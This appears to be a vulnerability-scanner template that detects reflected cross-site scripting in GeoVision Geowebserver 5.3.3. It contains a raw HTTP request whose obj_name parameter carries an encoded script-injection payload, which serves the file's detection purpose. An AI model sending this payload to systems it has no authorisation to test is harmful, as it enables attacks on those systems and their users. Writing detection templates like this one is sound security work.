http:
- matchers:
  - part: body
    regex:
    - </script><script>alert(document.domain)</script>
    type: regex
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  raw:
  - 'GET /Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
id: geowebserver-xss
info:
  author: madrobot
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: GeoVision Geowebserver 5.3.3 and prior versions are vulnerable to several
    cross-site scripting / HTML injection / local file inclusion / XML injection /
    code execution vectors because the application fails to properly sanitize user
    requests.
  metadata:
    max-request: 1
  name: GeoVision Geowebserver 5.3.3 - Cross-Site Scripting
  reference:
  - https://packetstormsecurity.com/files/163860/geovisiongws533-lfixssxsrfexec.txt
  severity: high
  tags: geowebserver,xss,packetstorm,vuln
